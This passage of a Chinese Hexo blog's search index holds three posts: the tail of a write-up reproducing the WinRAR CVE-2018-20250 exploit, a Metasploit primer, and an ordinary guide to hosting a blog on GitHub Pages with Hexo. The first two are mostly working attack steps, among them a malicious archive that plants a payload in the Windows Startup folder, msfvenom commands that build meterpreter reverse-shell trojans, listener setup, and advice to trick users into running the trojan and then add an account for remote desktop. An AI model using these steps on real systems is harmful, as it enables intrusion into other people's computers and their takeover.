src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/asd57h.png" alt></p><p>打开exp.py文件把“calc.exe“修改成”WinRarPayload.exe”保存</p><p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/sdasdf676.png" alt></p><p>Python运行exp.py文件自动在文件根目录下生成恶意压缩包。</p><p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/Y4HG8TCD3.png" alt></p><p>已经成功生成了恶意的压缩包，这时候可以往里面放一些引诱文件就变成了诱人的压缩包了。</p><p>Windows7靶机下载解压这个恶意压缩包：</p><p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/saass.png" alt></p><p>解压后自动在系统启动目录下自动出现我们之前生成的Payload</p><p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/dfgjhjh456754.png" alt></p><p>Windows7系统启动目录:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure><p>Metasploit启动远程监听主机上线请求:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.10.20</span><br><span class="line">set lport 8878</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/%$V6[`8.png" alt></p><p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/2B3X4XPAT0W.png" alt></p><p>确保ngrok后台在运行,然后重启Windows7靶机，metasploit监听等待上线</p><h3 id="5-验证payload"><a href="#5-验证payload" class="headerlink" title="5. 验证payload"></a>5. 验证payload</h3><p>待更新</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WinRAR </tag>
            
            <tag> Metasploit </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit(MSF)入门</title>
      <link href="/2019/03/14/Metasploit-MSF/"/>
      <url>/2019/03/14/Metasploit-MSF/</url>
      
        <content type="html"><![CDATA[<h2 id="一、Metasploit介绍"><a href="#一、Metasploit介绍" class="headerlink" title="一、Metasploit介绍"></a>一、Metasploit介绍</h2><p>综合利用工具，集成了上千种漏洞利用方式，操作简单易上手。</p><h2 id="二、Metasploit启动"><a href="#二、Metasploit启动" class="headerlink" title="二、Metasploit启动"></a>二、Metasploit启动</h2><p>kali集成了Metasploit框架，依赖于postgresql数据库</p><ol><li><p>先启动数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/postgresql start</span><br></pre></td></tr></table></figure></li><li><p>启动MSF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure></li></ol><h2 id="三、生成木马程序"><a href="#三、生成木马程序" class="headerlink" title="三、生成木马程序"></a>三、生成木马程序</h2><p>利用MSF生成木马获取meterpreter反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.14 lport=8787 -f exe &gt;./demo.exe</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.131 lport=4444 -f exe -a x86 --platform win -o shell.exe</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.59.128 LPORT=6666 -f elf &gt;shell.elf</span><br></pre></td></tr></table></figure><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-p  选用什么payload</span><br><span class="line">lhost  监听ip</span><br><span class="line">lport  监听端口</span><br><span class="line">-a系统位数</span><br><span class="line">-f  生成文件的类型</span><br><span class="line">-o输出</span><br></pre></td></tr></table></figure><h2 id="四、投放木马到目标机上"><a href="#四、投放木马到目标机上" class="headerlink" title="四、投放木马到目标机上"></a>四、投放木马到目标机上</h2><h2 id="五、开启监听"><a href="#五、开启监听" class="headerlink" title="五、开启监听"></a>五、开启监听</h2><p>启用MSF，具体操作如下：</p><ol><li><p>加载expuse </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/multi/handler</span><br></pre></td></tr></table></figure></li><li><p>加载payload（要和生成木马选用的payload一致）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure></li><li><p>查看哪些参数是需要输入的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">show opptions</span><br><span class="line">#设置监听的IP</span><br><span class="line">set lhost 192.168.10.14</span><br><span class="line">#设置监听的端口</span><br><span class="line">set lport 8787</span><br></pre></td></tr></table></figure></li><li><p>运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run/exploit</span><br></pre></td></tr></table></figure></li></ol><h2 id="六、进行欺骗"><a href="#六、进行欺骗" class="headerlink" title="六、进行欺骗"></a>六、进行欺骗</h2><ol><li>诱导用户点击我们的木马程序</li><li>等待用户上线，就能得到meterpreter</li></ol><h2 id="七、获得shell"><a href="#七、获得shell" class="headerlink" title="七、获得shell"></a>七、获得shell</h2><ol><li><p>执行shell 进到被攻击者电脑的终端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure></li><li><p>添加添加用户  开机3389 连接桌面(</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 192.168.10.19</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用GitHub Pages搭建个人博客</title>
      <link href="/2019/03/13/%E5%88%A9%E7%94%A8github%20pages+hexo%20%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
      <url>/2019/03/13/%E5%88%A9%E7%94%A8github%20pages+hexo%20%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="一、创建GitHub-Pages"><a href="#一、创建GitHub-Pages" class="headerlink" title="一、创建GitHub Pages"></a>一、创建GitHub Pages</h2><p>使用GitHub Pages搭建博客的好处有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 全是静态文件，访问速度快；</span><br><span class="line">2. 免费方便，不用花一分钱就可以搭建一个自由的个人博客，不需要服务器不需要后台；</span><br><span class="line">3. 可以随意绑定自己的域名，不仔细看的话根本看不出来你的网站是基于github的；</span><br><span class="line">4. 数据绝对安全，基于github的版本管理，想恢复到哪个历史版本都行；</span><br><span class="line">5. 博客内容可以轻松打包、转移、发布到其它平台；</span><br><span class="line">6. 等等；</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="1-首先创建存储库"><a href="#1-首先创建存储库" class="headerlink" title="1. 首先创建存储库"></a>1. 首先创建存储库</h3><p>前往<a href="https://github.com/" target="_blank" rel="noopener">GitHub</a>并<a href="https://github.com/new" target="_blank" rel="noopener">创建一个</a>名为<em>username</em> .github.io <a href="https://github.com/new" target="_blank" rel="noopener">的新存储库</a>，其中<em>username</em>是GitHub上的用户名（或组织名称）</p><p><img src="/2019/03/13/利用github pages+hexo 搭建个人博客/1552609247373.png" alt="1552609247373"></p><p><strong>注意：如果存储库名字的第一部分与你的用户名不完全匹配，则无法正常工作，因此请务必正确使用。</strong></p><h3 id="2-安装-Git"><a href="#2-安装-Git" class="headerlink" title="2. 安装 Git"></a>2. 安装 Git</h3><ul><li>Windows：下载并安装 <a href="https://git-scm.com/download/win" target="_blank" rel="noopener">git</a>.</li><li>Mac：使用 <a href="http://mxcl.github.com/homebrew/" target="_blank" rel="noopener">Homebrew</a>, <a href="http://www.macports.org/" target="_blank" rel="noopener">MacPorts</a> ：<code>brew install git</code>;或下载 <a href="http://sourceforge.net/projects/git-osx-installer/" target="_blank" rel="noopener">安装程序</a> 安装。</li><li>Linux (Ubuntu, Debian)：<code>sudo apt-get install git-core</code></li><li>Linux (Fedora, Red Hat, CentOS)：<code>sudo yum install git-core</code> </li></ul><h3 id="3-配置SSH连接GitHub"><a href="#3-配置SSH连接GitHub" class="headerlink" title="3. 配置SSH连接GitHub"></a>3. 配置SSH连接GitHub</h3><ol><li><p>配置SSH Key</p><ul><li><p>检查本机是否有ssh key设置</p><p>右键打开git bash</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ~/.ssh</span><br></pre></td></tr></table></figure><ul><li>如果没有则提示： No such file or directory，则需要生成ssh密钥</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;github注册邮箱&quot;</span><br></pre></td></tr></table></figure><ul><li><p>然后连续3次回车，最终会生成一个.ssh文件 复制.ssh/id_rsa.pub里内容<br>路径为：C:\Users\Administrator/.ssh (Administrator为你当前登录电脑使用的用户名)</p></li><li><p>打开github - 右上角头像 -Setting - SSH and GPG keys - New SSH key<br>title随便填写，Key内容为.ssh/id_rsa.pub的内容</p><p><img src="/2019/03/13/利用github pages+hexo 搭建个人博客/14398360-5516f5c5666265cd.png" alt="利用github pages+hexo 搭建个人博客"></p></li></ul></li><li><p>配置账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name “your_username”  #设置用户名</span><br><span class="line">git config --global user.email “your_registered_github_Email”  </span><br><span class="line">#设置邮箱地址(建议用注册giuhub的邮箱)</span><br></pre></td></tr></table></figure></li></ol><ol start="3"><li><p>测试是否配置成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com       # 邮箱地址不需要改。</span><br></pre></td></tr></table></figure><p>直接回车，最后看到这个就说明大功告成：</p><p><em>Hi username! You’ve successfully authenticated, but GitHub does not provide shell access.</em></p></li></ol><h3 id="4-克隆到本地存储库"><a href="#4-克隆到本地存储库" class="headerlink" title="4. 克隆到本地存储库"></a>4. 克隆到本地存储库</h3><p>转到要存储项目的文件夹，然后克隆新存储库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/用户名/用户名.github.io</span><br></pre></td></tr></table></figure><h3 id="5-创建内容"><a href="#5-创建内容" class="headerlink" title="5. 创建内容"></a>5. 创建内容</h3><p>转入项目文件夹并添加index.html文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd username.github.io</span><br><span class="line">echo“Hello World”&gt;index.html</span><br></pre></td></tr></table></figure><h3 id="6-推送到GitHub"><a href="#6-推送到GitHub" class="headerlink" title="6. 推送到GitHub"></a>6. 推送到GitHub</h3><p>添加，提交和推送你的更改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add --all</span><br><span class="line">git commit -m“初始提交”</span><br><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure><h3 id="7-浏览你的Github-Pages"><a href="#7-浏览你的Github-Pages" class="headerlink" title="7.浏览你的Github Pages"></a>7.浏览你的Github Pages</h3><p>Well done，启动浏览器并转到<a href="https://username.github.io。" target="_blank" rel="noopener">https://username.github.io。</a></p><h2 id="二、使用Hexo博客框架"><a href="#二、使用Hexo博客框架" class="headerlink" title="二、使用Hexo博客框架"></a>二、使用Hexo博客框架</h2><p>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 <a href="http://daringfireball.net/projects/markdown/" target="_blank" rel="noopener">Markdown</a>（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p><h3 id="1-安装前提"><a href="#1-安装前提" class="headerlink" title="1. 安装前提"></a>1. 安装前提</h3><ol><li>安装 Hexo 相当简单。然而在安装前，需确保已安装下列应用程序：</li></ol><ul><li><p><a href="http://nodejs.org/" target="_blank" rel="noopener">Node.js</a></p></li><li><p><a href="http://git-scm.com/" target="_blank" rel="noopener">Git</a></p></li></ul><ol start="2"><li><p>安装 Git，并开启ssh连接</p><p>上文已介绍安装和连接步骤</p></li></ol><ol start="3"><li>安装 Node.js</li></ol><p>安装 Node.js 的最佳方式是使用 <a href="https://github.com/creationix/nvm" target="_blank" rel="noopener">nvm</a>。</p><p>cURL:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl https://raw.github.com/creationix/nvm/v0.33.11/install.sh | sh</span><br></pre></td></tr></table></figure><p>Wget:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget -qO- https://raw.github.com/creationix/nvm/v0.33.11/install.sh | sh</span><br></pre></td></tr></table></figure><p>安装完成后，重启终端并执行下列命令即可安装 Node.js。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nvm install stable</span><br></pre></td></tr></table></figure><p>或者您也可以下载 <a href="http://nodejs.org/" target="_blank" rel="noopener">安装程序</a> 来安装。</p><blockquote><p>Windows 用户</p><p>对于windows用户来说，建议使用安装程序进行安装。安装时，请勾选<strong>Add to PATH</strong>选项。<br>另外，您也可以使用<strong>Git Bash</strong>，这是git for windows自带的一组程序，提供了Linux风格的shell，在该环境下，您可以直接用上面提到的命令来安装Node.js。打开它的方法很简单，在任意位置单击右键，选择“Git Bash Here”即可。由于Hexo的很多操作都涉及到命令行，您可以考虑始终使用<strong>Git Bash</strong>来进行操作。</p></blockquote><h3 id="2-快速部署Hexo"><a href="#2-快速部署Hexo" class="headerlink" title="2. 快速部署Hexo"></a>2. 快速部署Hexo</h3><p>所有必备的应用程序安装完成后，即可使用 npm 安装 Hexo。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure><p>安装 Hexo 完成后，请执行下列命令，Hexo 将会在指定文件夹中新建所需要的文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo init &lt;folder&gt;</span><br><span class="line">cd &lt;folder&gt;</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><p>新建完成后，指定文件夹的目录如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml</span><br><span class="line">├── package.json</span><br><span class="line">├── scaffolds</span><br><span class="line">├── source</span><br><span class="line">|   ├── _drafts</span><br><span class="line">|   └── _posts</span><br><span class="line">└── themes</span><br></pre></td></tr></table></figure><p><strong>_config.yml</strong></p><p>网站的配置信息，您可以在此配置大部分的参数。</p><p><strong>package.json</strong></p><p>应用程序信息，新添加的插件内容也会出现在这里面。</p><p><strong>scaffolds</strong></p><p>模版文件夹。当您新建文章时，Hexo 会根据 scaffold 来建立文件。</p><p>这里放了三个模板文件，分别是新添加博客文章（posts）、新添加博客页（page）和新添加草稿（draft）的目标样式。</p><p><strong>source</strong></p><p>资源文件夹是存放博客内容的地方。除 <code>_posts</code> 文件夹之外，开头命名为 <code>_</code> (下划线)的文件 / 文件夹和隐藏的文件将会被忽略。之后我们通过命令新建tags（标签）还有categories（分类）页后，这里会相应地增加文件夹。</p><p><strong>themes</strong></p><p>主题文件夹。Hexo 会根据主题来生成静态页面。</p><h3 id="3-Hexo命令"><a href="#3-Hexo命令" class="headerlink" title="3. Hexo命令"></a>3. Hexo命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g(generate)#生成静态页面</span><br><span class="line">hexo s(server)#启动服务器，默认4000端口，在本地查看内容</span><br></pre></td></tr></table></figure><h3 id="4-部署到github"><a href="#4-部署到github" class="headerlink" title="4. 部署到github"></a>4. 部署到github</h3><p>修改git/blog/_config.yml配置，找到Deployment部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: &lt;repository url&gt; #https://bitbucket.org/JohnSmith/johnsmith.bitbucket.io</span><br><span class="line">  branch: [branch] #published</span><br><span class="line">  message: [message]</span><br></pre></td></tr></table></figure><p>安装 hexo-deployer-git</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save   #第一次部署需要先安装插件</span><br></pre></td></tr></table></figure><p><strong>部署</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d(deploy) #部署到网站</span><br></pre></td></tr></table></figure><p>接下来可以访问我们的GitHub pages页面，查看效果啦</p><h3 id="5-最后"><a href="#5-最后" class="headerlink" title="5. 最后"></a>5. 最后</h3><p>关于hexo的最新详细配置，可以参考[hexo官方文档]:<a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">https://hexo.io/zh-cn/docs/</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> github </tag>
            
            <tag> 博客 </tag>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
